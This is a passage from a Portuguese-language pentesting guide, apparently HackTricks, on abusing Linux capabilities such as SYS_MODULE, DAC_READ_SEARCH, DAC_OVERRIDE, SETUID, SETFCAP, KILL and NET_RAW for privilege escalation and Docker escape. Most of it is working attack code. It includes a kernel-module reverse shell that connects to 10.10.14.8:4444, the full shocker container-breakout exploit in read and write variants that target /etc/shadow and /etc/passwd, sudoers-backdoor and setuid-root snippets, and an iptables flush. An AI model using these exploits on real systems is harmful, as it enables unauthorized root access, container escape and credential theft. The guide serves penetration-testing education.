cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Em seguida, **compile o módulo do kernel que você pode encontrar 2 exemplos abaixo e copie** para esta pasta:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Por fim, execute o código Python necessário para carregar este módulo de kernel:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**Exemplo 2 com binário**

No exemplo a seguir, o binário **`kmod`** possui essa capacidade.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Isso significa que é possível usar o comando **`insmod`** para inserir um módulo de kernel. Siga o exemplo abaixo para obter um **shell reverso** abusando desse privilégio.

**Exemplo com ambiente (Docker breakout)**

Você pode verificar as capacidades habilitadas dentro do contêiner Docker usando:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Dentro da saída anterior, você pode ver que a capacidade **SYS\_MODULE** está habilitada.

**Crie** o **módulo do kernel** que irá executar um shell reverso e o **Makefile** para **compilá-lo**:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
O caractere em branco antes de cada palavra make no arquivo Makefile **deve ser um tab, não espaços**!
{% endhint %}

Execute `make` para compilá-lo.

```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Finalmente, inicie `nc` dentro de um shell e **carregue o módulo** a partir de outro e você capturará o shell no processo nc:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**O código desta técnica foi copiado do laboratório de "Abusing SYS\_MODULE Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Outro exemplo desta técnica pode ser encontrado em [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite a um processo **burlar permissões para ler arquivos e para ler e executar diretórios**. Seu uso principal é para busca ou leitura de arquivos. No entanto, também permite que um processo utilize a função `open_by_handle_at(2)`, que pode acessar qualquer arquivo, incluindo aqueles fora do namespace de montagem do processo. O identificador usado em `open_by_handle_at(2)` deve ser um identificador não transparente obtido por meio de `name_to_handle_at(2)`, mas pode incluir informações sensíveis como números de inode que são vulneráveis a manipulação. O potencial de exploração dessa capacidade, especialmente no contexto de contêineres Docker, foi demonstrado por Sebastian Krahmer com o exploit shocker, conforme analisado [aqui](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3). **Isso significa que você pode** **burlar verificações de permissão de leitura de arquivos e verificações de permissão de leitura/execução de diretórios.**

**Exemplo com binário**

O binário será capaz de ler qualquer arquivo. Portanto, se um arquivo como tar tiver essa capacidade, ele será capaz de ler o arquivo shadow:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**Exemplo com binary2**

Neste caso, vamos supor que o binário **`python`** possui essa capacidade. Para listar arquivos raiz, você poderia fazer:

```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```

E para ler um arquivo você poderia fazer:

```python
print(open("/etc/shadow", "r").read())
```

**Exemplo no Ambiente (Fuga do Docker)**

Você pode verificar as capacidades habilitadas dentro do contêiner do Docker usando:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Dentro da saída anterior, você pode ver que a capacidade **DAC\_READ\_SEARCH** está habilitada. Como resultado, o contêiner pode **depurar processos**.

Você pode aprender como a seguinte exploração funciona em [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) mas em resumo **CAP\_DAC\_READ\_SEARCH** não apenas nos permite percorrer o sistema de arquivos sem verificações de permissão, mas também remove explicitamente quaisquer verificações para _**open\_by\_handle\_at(2)**_ e **pode permitir que nosso processo acesse arquivos sensíveis abertos por outros processos**.

O exploit original que abusa dessas permissões para ler arquivos do host pode ser encontrado aqui: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), o seguinte é uma **versão modificada que permite indicar o arquivo que deseja ler como primeiro argumento e despejá-lo em um arquivo.**

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```

{% hint style="warning" %}
O exploit precisa encontrar um ponteiro para algo montado no host. O exploit original usava o arquivo /.dockerinit e esta versão modificada usa /etc/hostname. Se o exploit não estiver funcionando, talvez você precise definir um arquivo diferente. Para encontrar um arquivo montado no host, basta executar o comando mount:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**O código desta técnica foi copiado do laboratório de "Abusing DAC\_READ\_SEARCH Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a missão de promover conhecimento técnico**, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e cibersegurança em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Isso significa que você pode ignorar verificações de permissão de escrita em qualquer arquivo, podendo escrever em qualquer arquivo.**

Existem muitos arquivos que você pode **sobrescrever para escalar privilégios,** [**você pode obter ideias daqui**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Exemplo com binário**

Neste exemplo, o vim possui essa capacidade, então você pode modificar qualquer arquivo como _passwd_, _sudoers_ ou _shadow_:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**Exemplo com binário 2**

Neste exemplo, o binário **`python`** terá essa capacidade. Você poderia usar o python para substituir qualquer arquivo:

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**Exemplo com ambiente + CAP\_DAC\_READ\_SEARCH (Docker breakout)**

Você pode verificar as capacidades habilitadas dentro do contêiner Docker usando:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Primeiramente, leia a seção anterior que [**abusa da capacidade DAC\_READ\_SEARCH para ler arquivos arbitrários**](linux-capabilities.md#cap\_dac\_read\_search) do host e **compile** o exploit.\
Em seguida, **compile a seguinte versão do exploit shocker** que permitirá que você **escreva arquivos arbitrários** no sistema de arquivos do host:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```

Para escapar do contêiner do docker, você poderia **baixar** os arquivos `/etc/shadow` e `/etc/passwd` do host, **adicionar** a eles um **novo usuário**, e usar **`shocker_write`** para sobrescrevê-los. Em seguida, **acessar** via **ssh**.

**O código desta técnica foi copiado do laboratório de "Abusing DAC\_OVERRIDE Capability" de** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**Isso significa que é possível alterar a propriedade de qualquer arquivo.**

**Exemplo com binário**

Vamos supor que o binário **`python`** tenha essa capacidade, você pode **alterar** o **proprietário** do arquivo **shadow**, **alterar a senha de root** e escalar privilégios:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Ou com o binário **`ruby`** tendo essa capacidade:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP\_FOWNER

**Isso significa que é possível alterar a permissão de qualquer arquivo.**

**Exemplo com binário**

Se o python tiver essa capacidade, você pode modificar as permissões do arquivo shadow, **alterar a senha de root** e elevar os privilégios:

```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```

### CAP\_SETUID

**Isso significa que é possível definir o ID de usuário efetivo do processo criado.**

**Exemplo com binário**

Se o python tiver essa **capacidade**, você pode facilmente abusar dela para escalar privilégios para root:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Outra maneira:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

## CAP\_SETGID

**Isso significa que é possível definir o id do grupo efetivo do processo criado.**

Há muitos arquivos que você pode **sobrescrever para escalar privilégios,** [**você pode obter ideias daqui**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Exemplo com binário**

Neste caso, você deve procurar por arquivos interessantes que um grupo pode ler, pois você pode se passar por qualquer grupo:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Uma vez que você encontrar um arquivo que pode ser abusado (através de leitura ou escrita) para escalar privilégios, você pode **obter um shell se passando pelo grupo interessante** com:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

Neste caso, o grupo shadow foi impersonado para que você possa ler o arquivo `/etc/shadow`:

```bash
cat /etc/shadow
```

Se o **docker** estiver instalado, você poderia **se passar** pelo grupo **docker** e abusá-lo para se comunicar com o [**socket do docker** e escalar privilégios](./#writable-docker-socket).

## CAP\_SETFCAP

**Isso significa que é possível definir capacidades em arquivos e processos**

**Exemplo com binário**

Se o python tiver essa **capacidade**, você pode facilmente abusá-la para escalar privilégios para root:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}

```bash
python setcapability.py /usr/bin/python2.7
```

{% hint style="warning" %}
Note que se você definir uma nova capacidade para o binário com CAP\_SETFCAP, você perderá essa capacidade.
{% endhint %}

Uma vez que você tenha a [capacidade SETUID](linux-capabilities.md#cap\_setuid), você pode ir para a sua seção para ver como escalar privilégios.

**Exemplo com ambiente (fuga do Docker)**

Por padrão, a capacidade **CAP\_SETFCAP é dada ao processo dentro do contêiner no Docker**. Você pode verificar isso fazendo algo como:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

Esta capacidade permite **dar qualquer outra capacidade a binários**, então poderíamos pensar em **escapar** do contêiner **abusando de qualquer uma das outras quebras de capacidade** mencionadas nesta página.\
No entanto, se você tentar dar, por exemplo, as capacidades CAP\_SYS\_ADMIN e CAP\_SYS\_PTRACE ao binário gdb, você verá que pode dá-las, mas o **binário não será capaz de executar depois disso**:

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

[Da documentação](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitido: Este é um **subconjunto limitante para as capacidades efetivas** que a thread pode assumir. Também é um subconjunto limitante para as capacidades que podem ser adicionadas ao conjunto herdável por uma thread que **não possui a capacidade CAP\_SETPCAP** em seu conjunto efetivo._\
Parece que as capacidades Permitidas limitam aquelas que podem ser usadas.\
No entanto, o Docker também concede o **CAP\_SETPCAP** por padrão, então você pode ser capaz de **definir novas capacidades dentro das herdáveis**.\
No entanto, na documentação deste cap: _CAP\_SETPCAP: \[...] **adicionar qualquer capacidade do conjunto de limites da thread chamadora** ao seu conjunto herdável_.\
Parece que só podemos adicionar ao conjunto herdável capacidades do conjunto de limites. O que significa que **não podemos adicionar novas capacidades como CAP\_SYS\_ADMIN ou CAP\_SYS\_PTRACE no conjunto herdável para escalar privilégios**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) fornece uma série de operações sensíveis, incluindo acesso a `/dev/mem`, `/dev/kmem` ou `/proc/kcore`, modificar `mmap_min_addr`, acessar chamadas de sistema `ioperm(2)` e `iopl(2)`, e vários comandos de disco. O `ioctl(2) FIBMAP` também é habilitado por meio dessa capacidade, o que causou problemas no [passado](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Conforme a página do manual, isso também permite ao detentor `realizar descritivamente uma série de operações específicas do dispositivo em outros dispositivos`.

Isso pode ser útil para **escalada de privilégios** e **fuga do Docker**.

## CAP\_KILL

**Isso significa que é possível matar qualquer processo.**

**Exemplo com binário**

Vamos supor que o binário **`python`** tenha essa capacidade. Se você pudesse **também modificar alguma configuração de serviço ou soquete** (ou qualquer arquivo de configuração relacionado a um serviço), você poderia colocar uma porta dos fundos nele e, em seguida, matar o processo relacionado a esse serviço e aguardar a execução do novo arquivo de configuração com sua porta dos fundos.

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc com kill**

Se você tiver capacidades de kill e houver um **programa node em execução como root** (ou como um usuário diferente), você provavelmente poderá **enviar** a ele o **sinal SIGUSR1** e fazer com que ele **abra o depurador node** para que você possa se conectar.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a missão de promover o conhecimento técnico**, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e cibersegurança em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Isso significa que é possível escutar em qualquer porta (mesmo em portas privilegiadas).** Você não pode escalar privilégios diretamente com essa capacidade.

**Exemplo com binário**

Se o **`python`** tiver essa capacidade, ele poderá escutar em qualquer porta e até mesmo se conectar a partir dela para qualquer outra porta (alguns serviços exigem conexões de portas específicas de privilégio)

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

## CAP\_NET\_RAW

A capacidade **CAP\_NET\_RAW** permite que os processos **criem soquetes RAW e PACKET**, permitindo que eles gerem e enviem pacotes de rede arbitrários. Isso pode levar a riscos de segurança em ambientes containerizados, como falsificação de pacotes, injeção de tráfego e contornando controles de acesso à rede. Atacantes maliciosos poderiam explorar isso para interferir no roteamento de contêineres ou comprometer a segurança da rede do host, especialmente sem proteções adequadas de firewall. Além disso, **CAP\_NET\_RAW** é crucial para contêineres privilegiados para suportar operações como ping via solicitações ICMP RAW.

**Isso significa que é possível interceptar o tráfego.** Você não pode escalar privilégios diretamente com essa capacidade.

**Exemplo com binário**

Se o binário **`tcpdump`** tiver essa capacidade, você poderá usá-lo para capturar informações de rede.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

Observe que se o **ambiente** estiver fornecendo essa capacidade, você também pode usar o **`tcpdump`** para capturar o tráfego.

**Exemplo com binário 2**

O exemplo a seguir é um código em **`python2`** que pode ser útil para interceptar o tráfego da interface "**lo**" (**localhost**). O código é do laboratório "_The Basics: CAP-NET\_BIND + NET\_RAW_" de [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```

## CAP\_NET\_ADMIN + CAP\_NET\_RAW

A capacidade [**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) concede ao detentor o poder de **alterar configurações de rede**, incluindo configurações de firewall, tabelas de roteamento, permissões de soquete e configurações de interface de rede dentro dos namespaces de rede expostos. Também permite ativar o **modo promíscuo** em interfaces de rede, permitindo a captura de pacotes em todos os namespaces.

**Exemplo com binário**

Vamos supor que o **binário python** tenha essas capacidades.

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP\_LINUX\_IMMUTABLE

**Isso significa que é possível modificar os atributos do inode.** Você não pode escalar privilégios diretamente com essa capacidade.

**Exemplo com binário**

Se você descobrir que um arquivo é imutável e o python tem essa capacidade, você pode **remover o atributo imutável e tornar o arquivo modificável:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

